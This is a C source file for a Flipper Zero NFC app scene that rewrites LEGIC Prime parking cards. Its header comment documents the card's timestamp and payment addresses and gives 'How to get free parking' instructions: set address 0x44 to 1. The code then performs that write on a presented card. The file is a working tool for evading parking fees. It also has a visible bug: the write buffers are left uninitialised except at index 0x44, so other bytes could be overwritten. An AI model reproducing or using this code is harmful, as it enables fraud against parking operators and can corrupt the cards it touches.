#include "../nfc_app_i.h"

#include <datetime.h>
#include <nfc/protocols/legic_prime/legic_prime_poller.h>

/*
    Day 0 is Aug. 22, 1990
    Minutes is 5min ahead.

    entry days addr: 0x3e, 0x3f
    entry minutes addr: 0x40, 0x41
    exit days addr: 0x4b, 0x4c
    exit minutes addr: 0x4d, 0x4e
    0x4f val: 0x32 (== dec 50, == amount paid???)
    amount paid addr: 0x4f, 0x50?


    How to get free parking:
    ========================

    Turns out, all you have to do is set address 0x44 to 1.
    Also, the entry timestamp cannot be too far in the past.
*/

#define REF_YEAR 1990 // full year
#define REF_MON 8     // months (1-12)
#define REF_MDAY 22   // day of month (1-31)

#define MINUTES_OFFSET 5 // minutes to add to the calculated timestamp

#define ENTRY_D_ADDR 0x3e
#define ENTRY_M_ADDR 0x40
#define EXIT_D_ADDR 0x4b
#define EXIT_M_ADDR 0x4d
#define AMOUNT_PAID_ADDR 0x4f
#define MYSTERY_BYTE_1 0x3c
#define MYSTERY_BYTE_2 0x3d
#define EXIT_FREE 0x44

static DateTime tm_ref = {
    .hour = 0,
    .minute = 0,
    .second = 0,
    .year = REF_YEAR,
    .month = REF_MON,
    .day = REF_MDAY,
};

typedef uint32_t time_t;

uint16_t get_days(void) {
  time_t t_ref = datetime_datetime_to_timestamp(&tm_ref);
  time_t t_now = furi_hal_rtc_get_timestamp();
  time_t t_diff = t_now - t_ref;
  time_t days = t_diff / 3600 / 24;

  return (uint16_t)days;
}

uint16_t get_minutes(void) {
  DateTime tm_now;
  furi_hal_rtc_get_datetime(&tm_now);

  return tm_now.hour * 60 + tm_now.minute + MINUTES_OFFSET;
}

time_t card_ts_to_time_t(uint16_t days, uint16_t mins) {
  time_t t_ref = datetime_datetime_to_timestamp(&tm_ref);
  time_t days_in_secs = days * 3600 * 24;
  time_t mins_in_secs = mins * 60;

  return t_ref + days_in_secs + mins_in_secs;
}

NfcCommand nfc_scene_legic_prime_set_0x44_worker_callback(NfcGenericEvent event,
                                                          void *context) {
  furi_assert(context);
  furi_assert(event.event_data);
  furi_assert(event.protocol == NfcProtocolLegicPrime);

  NfcCommand command = NfcCommandContinue;
  NfcApp *instance = context;
  LegicPrimePollerEvent *legic_prime_event = event.event_data;

  if (legic_prime_event->type == LegicPrimePollerEventTypeRequestMode) {
    uint8_t write_bytes[256];
    uint8_t write_mask[256];
    LegicPrimeData *write_data = legic_prime_alloc();
    const LegicPrimeData *read_data =
        nfc_device_get_data(instance->nfc_device, NfcProtocolLegicPrime);

    write_bytes[0x44] = 0x01 ^ read_data->data[4];
    write_mask[0x44] = 0xff;

    memcpy(write_data->data, write_bytes, 256);
    legic_prime_event->write_data = write_data;
    memcpy(legic_prime_event->write_mask, write_mask, 256);

    legic_prime_event->data->poller_mode.mode = LegicPrimePollerModeWrite;

  } else if (legic_prime_event->type == LegicPrimePollerEventTypeSuccess) {
    view_dispatcher_send_custom_event(instance->view_dispatcher,
                                      NfcCustomEventPollerSuccess);
    command = NfcCommandStop;
  } else if (legic_prime_event->type == LegicPrimePollerEventTypeFail) {
    view_dispatcher_send_custom_event(instance->view_dispatcher,
                                      NfcCustomEventPollerFailure);
    command = NfcCommandStop;
  }
  return command;
}

static void nfc_scene_legic_prime_set_0x44_setup_view(NfcApp *instance) {
  Popup *popup = instance->popup;
  popup_reset(popup);

  popup_set_header(popup, "Writing\nDon't move...", 52, 32, AlignLeft,
                   AlignCenter);
  popup_set_icon(popup, 12, 23, &A_Loading_24);

  view_dispatcher_switch_to_view(instance->view_dispatcher, NfcViewPopup);
}

void nfc_scene_legic_prime_set_0x44_on_enter(void *context) {
  NfcApp *instance = context;
  dolphin_deed(DolphinDeedNfcEmulate);

  nfc_scene_legic_prime_set_0x44_setup_view(instance);

  // Setup and start worker
  instance->poller = nfc_poller_alloc(instance->nfc, NfcProtocolLegicPrime);
  nfc_poller_start(instance->poller,
                   nfc_scene_legic_prime_set_0x44_worker_callback, instance);

  nfc_blink_emulate_start(instance);
}

bool nfc_scene_legic_prime_set_0x44_on_event(void *context,
                                             SceneManagerEvent event) {
  NfcApp *instance = context;
  bool consumed = false;

  if (event.type == SceneManagerEventTypeCustom) {
    if (event.event == NfcCustomEventPollerSuccess) {
      scene_manager_next_scene(instance->scene_manager,
                               NfcSceneLegicPrimeSet44Success);
      consumed = true;
    } else if (event.event == NfcCustomEventPollerFailure) {
      scene_manager_next_scene(instance->scene_manager,
                               NfcSceneLegicPrimeSet44Fail);
      consumed = true;
    }
  }

  return consumed;
}

void nfc_scene_legic_prime_set_0x44_on_exit(void *context) {
  NfcApp *instance = context;

  nfc_poller_stop(instance->poller);
  nfc_poller_free(instance->poller);
  // Clear view
  popup_reset(instance->popup);

  nfc_blink_stop(instance);
}
